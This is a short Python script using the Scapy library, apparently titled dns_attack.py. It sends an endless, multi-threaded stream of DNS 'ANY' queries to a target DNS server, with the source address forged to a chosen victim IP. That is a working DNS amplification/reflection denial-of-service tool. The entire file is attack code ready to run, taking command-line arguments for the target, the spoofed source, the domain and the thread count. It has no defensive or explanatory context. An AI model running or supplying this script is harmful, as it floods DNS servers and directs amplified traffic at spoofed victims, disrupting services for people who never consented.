from scapy.all import *
from time import sleep
import threading  # Correctly import threading for handling new threads
import sys


def DNS_Server_Attack(DNS_Server_IP, attack_source_IP, Domain_name):
    while True:
        send(IP(dst=DNS_Server_IP, src=attack_source_IP) / UDP() / DNS(rd=1, qdcount=1,
                                                                       qd=DNSQR(qname=Domain_name, qtype=255)),
             verbose=0)


def main():
    if len(sys.argv) != 5:
        print("参数错误，用法如下:")
        print("python dns_attack.py [DNS Server IP] [Source IP] [Domain Name] [Thread Count]")
        sys.exit()

    DNS_Server_IP = sys.argv[1]
    attack_source_IP = sys.argv[2]
    Domain_Name = sys.argv[3]
    thread_count = int(sys.argv[4])
    print("DNS Server Attack started, press Ctrl+C to stop.")

    # Create and start threads for the attack
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=DNS_Server_Attack, args=(DNS_Server_IP, attack_source_IP, Domain_Name))
        thread.start()
        threads.append(thread)

    # Keep the main thread running while child threads are working
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Attack stopped by user.")
        sys.exit()


if __name__ == "__main__":
    main()
